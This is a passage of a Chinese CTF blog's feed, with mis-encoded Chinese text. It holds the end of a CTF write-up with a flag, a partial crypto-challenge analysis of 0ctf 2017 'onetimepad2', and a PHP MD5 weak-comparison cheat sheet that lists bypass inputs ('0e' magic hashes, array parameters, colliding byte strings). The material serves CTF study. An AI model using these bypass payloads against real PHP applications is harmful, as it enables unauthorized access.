class="line">con.send(cd)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> con.recvuntil(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°!Not in leaves? Here is your reward: ctf{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol}</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡HWBè‚äº†4å¤©åŠæ•°å­¦ä½œä¸šå †äº†å¥½å¤šâ€¦ä¸è¿‡æ€»çš„æ¥è¯´è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿çš„(æ–°ä¸œè¥¿éƒ½åœ¨wpè¯¦ç»†å†™äº†, æ‰€ä»¥æœ‰äº›åœ°æ–¹è¯¦ç»†æœ‰äº›åœ°æ–¹ç®€ç•¥.<br>ç‰¹åˆ«æ˜¯web, çœŸçš„å­¦åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿,ä¹Ÿç®—æ˜¯æ”¶è·æ»¡æ»¡çš„<br>Miscä¹Ÿæ˜¯ç†Ÿæ‚‰äº†å¾ˆå¤šå¥—è·¯å§<br>ä¸è¿‡å­¦äº†æŒºä¹…å¯†ç ä½†æ˜¯æ²¡æœ‰å…¨éƒ¨åšå‡ºæ¥å¤ªéš¾å—äº†â€¦<br>æ‰€ä»¥æœ‰è¶£çš„åŠ å¯†åˆ°åº•è¯¥æ€ä¹ˆåšâ€¦</p><blockquote><p>å¤§æ¦‚å°±è¿™äº›äº†,å‰é¢çš„å¤§ä½¬å¤ªå¼ºäº†, æ ¹æœ¬æ‰“ä¸è¿‡â€¦<br>ç»§ç»­åŠ æ²¹å§<br>å“¦å¯¹ æ–‡ç« é‡Œæœ‰é”™çš„åœ°æ–¹è¯·å¤§ä½¬åŠ¡å¿…æé†’æˆ‘!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;è¿™æ¬¡é¡¶ç€æ¡è€çˆ·çš„id(kirito zbds, æœ¬æ¥åªæ˜¯æƒ³ç€åšåšWebå’Œå°è¯•åšå®ŒCryptoçš„(ç»“æœæ²¡æœ‰åšå®Œ,æœ‰è¶£çš„åŠ å¯†&lt;del&gt;æ˜¯çœŸçš„æœ‰è¶£&lt;/del&gt;, ç»“æœå‘ç°ä¸åšMiscåˆ†ä¸å¤ªå¤Ÿ, å°±è‚äº†å‡ é“, è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿çš„.&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Crypto - onetimepad2, understand the nature of the algorithm</title>
    <link href="http://tearsjin.github.io/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/"/>
    <id>http://tearsjin.github.io/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/</id>
    <published>2020-10-29T16:35:09.000Z</published>
    <updated>2021-03-13T03:10:23.812Z</updated>
    
    <content type="html"><![CDATA[<p>0ctf quals 2017çš„é¢˜, æ˜¯ä¹‹å‰åšè¿‡çš„onetimepadçš„å‡çº§ç‰ˆ. å› ä¸ºè¿™é“é¢˜æ¶‰åŠåˆ°äº†æœ‰é™åŸŸä¸‹ä¹˜æ³•, çŸ©é˜µä¹˜æ³•, å¿«é€Ÿå¹‚, ç¦»æ•£å¯¹æ•°, æ‰€ä»¥è®°å½•ä¸€ä¸‹(å­¦è´¹äº†å­¦è´¹äº†â€¦</p><h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><p>å…ˆä¸Šä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process1</span>(<span class="params">m, k</span>):</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(k)[<span class="number">2</span>:]:</span><br><span class="line">        res = res &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(i)):</span><br><span class="line">            res = res ^ m</span><br><span class="line">        <span class="keyword">if</span> (res &gt;&gt; <span class="number">128</span>):</span><br><span class="line">            res = res ^ P</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process2</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    res.append(process1(a[<span class="number">0</span>], b[<span class="number">0</span>]) ^ process1(a[<span class="number">1</span>], b[<span class="number">2</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">0</span>], b[<span class="number">1</span>]) ^ process1(a[<span class="number">1</span>], b[<span class="number">3</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">2</span>], b[<span class="number">0</span>]) ^ process1(a[<span class="number">3</span>], b[<span class="number">2</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">2</span>], b[<span class="number">1</span>]) ^ process1(a[<span class="number">3</span>], b[<span class="number">3</span>]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextrand</span>(<span class="params">rand</span>):</span></span><br><span class="line">    <span class="keyword">global</span> N, A, B</span><br><span class="line">    tmp1 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    tmp2 = [A, B, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    s = N</span><br><span class="line">    N = process1(N, N)</span><br><span class="line">    <span class="keyword">while</span> s:</span><br><span class="line">        <span class="keyword">if</span> s % <span class="number">2</span>:</span><br><span class="line">            tmp1 = process2(tmp2, tmp1)</span><br><span class="line">        tmp2 = process2(tmp2, tmp2)</span><br><span class="line">        s = s / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> process1(rand, tmp1[<span class="number">0</span>]) ^ tmp1[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    key = str2num(urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> key</span><br><span class="line">        key = nextrand(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(message)</span><br><span class="line">    pad = <span class="string">&#x27;\x00&#x27;</span> + urandom(<span class="number">15</span> - (length % <span class="number">16</span>))</span><br><span class="line">    to_encrypt = message + pad</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    generator = keygen()</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="comment"># This is used to decrypt and of course you won&#x27;t get it.</span></span><br><span class="line">    <span class="keyword">for</span> i, key <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">16</span>), generator):</span><br><span class="line">        f.write(<span class="built_in">hex</span>(key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        res += num2str(str2num(to_encrypt[i:i+<span class="number">16</span>]) ^ key)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertxt</span>):</span></span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2num</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num2str</span>(<span class="params">n, block=<span class="number">16</span></span>):</span></span><br><span class="line">    s = <span class="built_in">hex</span>(n)[<span class="number">2</span>:].strip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    s = <span class="string">&#x27;0&#x27;</span> * ((<span class="number">32</span>-<span class="built_in">len</span>(s)) % <span class="number">32</span>) + s</span><br><span class="line">    <span class="keyword">return</span> s.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">P = <span class="number">0x100000000000000000000000000000087</span></span><br><span class="line">A = <span class="number">0xc6a5777f4dc639d7d1a50d6521e79bfd</span></span><br><span class="line">B = <span class="number">0x2e18716441db24baf79ff92393735345</span></span><br><span class="line">N = str2num(urandom(<span class="number">16</span>))</span><br><span class="line"><span class="keyword">assert</span> N != <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;top_secret&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        top_secret = f.read().strip()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(top_secret) == <span class="number">16</span></span><br><span class="line">    plain = <span class="string">&quot;One-Time Pad is used here. You won&#x27;t know that the flag is flag&#123;%s&#125;.&quot;</span> % top_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertxt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(encrypt(plain).encode(<span class="string">&#x27;hex&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ•´ä¸ªæµç¨‹æŒºç®€å•çš„, å°±æ˜¯å¯¹palinåŠ å¯†. ä½†æ˜¯é‡Œé¢çš„æ¯ä¸ªå‡½æ•°éƒ½æŒºæœ‰æ„æ€çš„. ä¸‹é¢ä¸€ä¸ªä¸€ä¸ªæ¥åˆ†æ</p><h1 id="process1-m-k"><a href="#process1-m-k" class="headerlink" title="process1(m,k)"></a>process1(m,k)</h1><p>å…ˆçœ‹<code>process1(m,k)</code><br>å¾ˆå¤šæ—¶å€™è¿™ç§çœ‹ç€å°±åƒåœ¨ä¸€ä¸ªåŸŸé‡Œé¢åšçš„è®¡ç®—, å¯ä»¥éšä¾¿å‡ ä¸ªå°çš„æ•°è¿›å»çœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆ. å¦‚æœæ˜¯ä¸€äº›ç®€å•çš„æ“ä½œæ¯”å¦‚åŠ å‡ä¹˜é™¤å•¥çš„ä¸€èˆ¬å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥.<br>è€Œè¿™ä¸ª<code>process1(m,k)</code>å°±æ˜¯åœ¨GF(2^128)ä¸‹åš<code>m*k</code>. å¯ä»¥ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªä¹˜æ³•å§. </p><h4 id="ä¸ºä»€ä¹ˆæ˜¯ä¸ªä¹˜æ³•å‘¢"><a href="#ä¸ºä»€ä¹ˆæ˜¯ä¸ªä¹˜æ³•å‘¢" class="headerlink" title="ä¸ºä»€ä¹ˆæ˜¯ä¸ªä¹˜æ³•å‘¢?"></a>ä¸ºä»€ä¹ˆæ˜¯ä¸ªä¹˜æ³•å‘¢?</h4><p>å¹³æ—¶çº¸ä¸Šç®—ä¹˜æ³•çš„æ—¶å€™éƒ½è¦ç”¨åˆ°ç«–å¼, è€Œè¿™é‡Œçš„ç®—æ³•å°±æ˜¯ä¸€ä¸ªå…ˆè®¡ç®—é«˜ä½çš„ç«–å¼.ä»æœ€é«˜ä½å¼€å§‹ä¸€ä½ä¸€ä½å¾€ä¸‹ä¹˜.(è¿™ä¸ªç”¨çº¸ä¸Šå†™å‡ºæ¥ä¼šå¥½ç†è§£å§, è¿™é‡Œå°±ä¸å†™äº†</p><h1 id="process2-a-b"><a href="#process2-a-b" class="headerlink" title="process2(a,b)"></a>process2(a,b)</h1><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸ªçŸ©é˜µçš„ä¹˜æ³•, è¾“å‡ºçš„å°±æ˜¯ çŸ©é˜µa * çŸ©é˜µb.</p><h4 id="æ€ä¹ˆçœ‹å‡ºæ¥"><a href="#æ€ä¹ˆçœ‹å‡ºæ¥" class="headerlink" title="æ€ä¹ˆçœ‹å‡ºæ¥?"></a>æ€ä¹ˆçœ‹å‡ºæ¥?</h4><p>ç»éªŒ? ä¸€èˆ¬é‡åˆ°è¿™ç§ä¸¤ä¸ªçŸ©é˜µ(æ•°åˆ—)ç‰¹å®šä¸‹æ ‡åœ¨è¿›è¡ŒåŠ å’Œä¹˜è®¡ç®—çš„, æŠŠæ¯ä¸ªå¼å­å†™å‡ºæ¥, çœ‹èƒ½ä¸èƒ½å†™æˆä¸¤ä¸ªçŸ©é˜µä¹‹é—´çš„æ“ä½œ, è€Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªçŸ©é˜µçš„ä¹˜æ³•</p><h1 id="nextrand-rand"><a href="#nextrand-rand" class="headerlink" title="nextrand(rand)"></a>nextrand(rand)</h1><p>è¿™ä¸ªå‡½æ•°æ‰æ˜¯é‡ç‚¹!!!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextrand</span>(<span class="params">rand</span>):</span></span><br><span class="line">    <span class="keyword">global</span> N, A, B</span><br><span class="line">    tmp1 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    tmp2 = [A, B, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    s = N</span><br><span class="line">    N = process1(N, N)</span><br><span class="line">    <span class="keyword">while</span> s:</span><br><span class="line">        <span class="keyword">if</span> s % <span class="number">2</span>:</span><br><span class="line">            tmp1 = process2(tmp2, tmp1)</span><br><span class="line">        tmp2 = process2(tmp2, tmp2)</span><br><span class="line">        s = s / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> process1(rand, tmp1[<span class="number">0</span>]) ^ tmp1[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>çœ‹ä¸æ‡‚çš„åœ°æ–¹å°±æ˜¯ä¸­é—´çš„å¾ªç¯ç»“æ„, ä¸çŸ¥é“å…·ä½“åœ¨å¹²ä»€ä¹ˆ. æŸ¥äº†ä¸€ä¸‹wpæ‰çŸ¥é“, è¿™æ˜¯ä¸ª<strong>å¿«é€Ÿå¹‚</strong>!!!æ²¡æƒ³åˆ°ç¬¬ä¸€æ¬¡æ¥è§¦å¿«é€Ÿå¹‚æ˜¯åœ¨å¯†ç çš„é¢˜ç›®é‡Œâ€¦</p><h2 id="å¿«é€Ÿå¹‚"><a href="#å¿«é€Ÿå¹‚" class="headerlink" title="å¿«é€Ÿå¹‚"></a>å¿«é€Ÿå¹‚</h2><p>ç®€å•è¯´ä¸€ä¸‹å¿«é€Ÿå¹‚å§, è®¡ç®—æœºè®¡ç®—ä¸€ä¸ªæ•°çš„é«˜æ¬¡å¹‚(ä¾‹å¦‚3^60^)çš„æ—¶å€™, å¦‚æœç›´æ¥è®¡ç®—60ä¸ª3ç›¸ä¹˜å°±ä¼šç‰¹åˆ«æ…¢, ä½†æ˜¯å¯ä»¥æŠŠ 3^60^ åŒ–æˆ 9^30^, è¿™æ ·å°±åªéœ€è¦ä¹˜30æ¬¡äº†.<br>ç»§ç»­ç®—ä¸‹å»ä¼šå‘ç”Ÿä¸€ä¸ªé—®é¢˜ 3^60^ = 9^30^ = 81^15^ è¿™é‡Œæœ‰ä¸ª15æ¬¡å¹‚, å¦‚æœé™¤ä»¥2å°±æ˜¯7.5, 7.5æ¬¡å¹‚æ˜¯æ²¡åŠæ³•è®¡ç®—çš„. æ‰€ä»¥è¿™é‡Œæœ‰ä¸ªæ“ä½œ, å°±æ˜¯81^15^ = 81^14^ * 81^1^, ç„¶åç»§ç»­å¯¹81^14^è¿›è¡ŒåŒ–ç®€.<br>æ‰€ä»¥æœ€ç»ˆçš„ç»“æœå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3^60 &#x3D; 9^30 &#x3D; 81^15 &#x3D; 81^14 * 81^1 &#x3D; 6561^7 + 81^1 &#x3D;....</span><br><span class="line">&#x3D; 43046721^3 * 43046721^1 * 6561^1 * 81^1</span><br><span class="line">&#x3D; 1853020188851841^1 * 43046721^1 * 6561^1 * 81^1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç»“æœæœ‰ä¸ªç‰¹ç‚¹, å°±æ˜¯æœ€åä¸€å®šä¼šåŒ–æˆå¤šä¸ªæ•°çš„ä¸€æ¬¡å¹‚çš„ä¹˜ç§¯.è€Œä»€ä¹ˆæ—¶å€™èƒ½åˆ†å‡ºä¸€æ¬¡å¹‚å‘¢? <strong>å°±æ˜¯æ¬¡å¹‚ä¸ºå¥‡æ•°çš„æ—¶å€™!!!</strong></p><h2 id="å›åˆ°å‡½æ•°"><a href="#å›åˆ°å‡½æ•°" class="headerlink" title="å›åˆ°å‡½æ•°"></a>å›åˆ°å‡½æ•°</h2><p>å›åˆ°å‡½æ•°é‡Œ, ç»“åˆä¸Šé¢è¯´çš„å¿«é€Ÿå¹‚çš„ç®—æ³•, å¯ä»¥çœ‹å‡ºè¿™ä¸ªå¾ªç¯å°±æ˜¯è®¡ç®—<br><code>tmp1 = tmp2^s</code>, </p><blockquote><p>æœªå®Œå¾…ç»­â€¦.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;0ctf quals 2017çš„é¢˜, æ˜¯ä¹‹å‰åšè¿‡çš„onetimepadçš„å‡çº§ç‰ˆ. å› ä¸ºè¿™é“é¢˜æ¶‰åŠåˆ°äº†æœ‰é™åŸŸä¸‹ä¹˜æ³•, çŸ©é˜µä¹˜æ³•, å¿«é€Ÿå¹‚, ç¦»æ•£å¯¹æ•°, æ‰€ä»¥è®°å½•ä¸€ä¸‹(å­¦è´¹äº†å­¦è´¹äº†â€¦&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®æºç &quot;&gt;&lt;a href=&quot;#é¢˜ç›®æºç &quot; class=&quot;header</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>PHP Weak type about MD5</title>
    <link href="http://tearsjin.github.io/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://tearsjin.github.io/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/</id>
    <published>2020-10-21T16:02:00.000Z</published>
    <updated>2021-03-13T03:06:58.931Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å°±æ˜¯å¯¹ä¸€äº›åœ¨PHPä¸­MD5å€¼åˆ¤æ–­çš„æ¼æ´çš„ç§¯ç´¯å§(<del>æ¯æ¬¡éƒ½è¦æŸ¥payloadå¾ˆéº»çƒ¦çš„</del></p><blockquote><p>ä¸ºäº†æ–¹ä¾¿, æ–‡ç« ä¸­çš„æ‰€æœ‰å˜é‡éƒ½ä¸å¸¦$</p></blockquote><h2 id="1-a-b-and-md5-a-md5-b"><a href="#1-a-b-and-md5-a-md5-b" class="headerlink" title="1. a != b and md5(a) == md5(b)"></a>1. a != b and md5(a) == md5(b)</h2><p>ç”¨==æ¥åˆ¤æ–­ä¸¤ä¸ªå˜é‡(<del>è¿™æ ·å†™è‚¯å®šä¼šè¢«å­¦é•¿éª‚çš„!!!</del>, æ€ä¹ˆç»•è¿‡å‘¢?<br>å…ˆç»™å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²å§<code>QNKCDZO</code> å’Œ <code>240610708</code> è€Œè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„MD5å€¼ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶, å®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0, å…·ä½“çš„åŸå› å‘¢æ˜¯å› ä¸º0eå¼€å¤´ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•, eåé¢çš„æ•°ä¼šè¢«è®¤ä¸ºæ˜¯æ¬¡å¹‚, è€Œä¸ç®¡0ä¹˜10çš„å‡ æ¬¡å¹‚éƒ½æ˜¯0. æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥å, å…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€œ0Eâ€å¼€å¤´çš„, é‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒ, éƒ½æ˜¯0.</p><h2 id="2-a-b-and-md5-a-md5-b"><a href="#2-a-b-and-md5-a-md5-b" class="headerlink" title="2. a !== b and md5(a) === md5(b)"></a>2. a !== b and md5(a) === md5(b)</h2><p>è¦é€šè¿‡è¿™ä¸ªåˆ¤æ–­, è¦åˆ©ç”¨MD5ä¸èƒ½å¤„ç†æ•°ç»„è¿™ä¸ªæ¼æ´, å°±æ˜¯è¯´å½“aå’Œbéƒ½æ˜¯æ•°ç»„çš„æ—¶å€™, md5(a) === md5(b) ä¼šåˆ¤æ–­ä¸ºçœŸ. è‡³äºæ€ä¹ˆè®©a !== b, <code>a[]=1;b[]=2</code>å°±è¡Œäº†.</p><h2 id="3-string-a-string-b-and-md5-a-md5-b"><a href="#3-string-a-string-b-and-md5-a-md5-b" class="headerlink" title="3. (string)a !== (string)b and md5(a) === md5(b)"></a>3. (string)a !== (string)b and md5(a) === md5(b)</h2><p>å•Šè¿™â€¦è¿™ä¸ªå¯ä»¥ç›´æ¥å»æ‰¾ä¸¤ä¸ªç›¸ç­‰md5çš„å­—ç¬¦ä¸².</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Param1</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="variable">$Param2</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="comment">#008ee33a9d58b51cfeb425b0959121c9</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ—¶å€™è®°å¾—ç›´æ¥æ·»åŠ åˆ°åŒ…é‡Œé¢å», æµè§ˆå™¨ä¸Šè¾“å…¥æ˜¯æ— æ•ˆçš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦å°±æ˜¯å¯¹ä¸€äº›åœ¨PHPä¸­MD5å€¼åˆ¤æ–­çš„æ¼æ´çš„ç§¯ç´¯å§(&lt;del&gt;æ¯æ¬¡éƒ½è¦æŸ¥payloadå¾ˆéº»çƒ¦çš„&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸ºäº†æ–¹ä¾¿, æ–‡ç« ä¸­çš„æ‰€æœ‰å˜é‡éƒ½ä¸å¸¦$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-a-b-and-md5-a-md</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="MD5" scheme="http://tearsjin.github.io/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>cryptopals</title>
    <link href="http://tearsjin.github.io/2020/10/10/cryptopals/"/>
    <id>http://tearsjin.github.io/2020/10/10/cryptopals/</id>
    <published>2020-10-10T07:51:07.000Z</published>
    <updated>2021-03-13T03:02:33.382Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å¼€å§‹å­¦ä¹ cryptopalså•¦, ä¸€é¢˜ä¸€é¢˜çš„åšå®Œå®ƒå§(ä¹Ÿä¸çŸ¥é“èƒ½åšå¤šä¹…â€¦</p></blockquote><h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><ul><li><a href="#1">cryptopals 1.1 - Convert hex to base64</a></li><li><a href="#2">cryptopals 1.2 - Fixed XOR</a></li><li><a href="#3">cryptopals 1.3 - Single-byte XOR cipher</a></li><li><a href="#4">cryptopals 1.4 - Detect single-character XOR</a></li><li><a href="#5">cryptopals 1.5 - Implement repeating-key XOR</a></li><li><a href="#6">cryptopals 1.6 - Break repeating-key XOR</a></li><li><a href="#7">cryptopals 1.7 - AES in ECB mode</a></li><li><a href="#7">cryptopals 1.8 - Detect AES in ECB mode</a></li></ul><p><a name='1'></a></p><h1 id="cryptopals-1-1-Convert-hex-to-base64"><a href="#cryptopals-1-1-Convert-hex-to-base64" class="headerlink" title="cryptopals 1.1 - Convert hex to base64"></a>cryptopals 1.1 - Convert hex to base64</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p> The string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 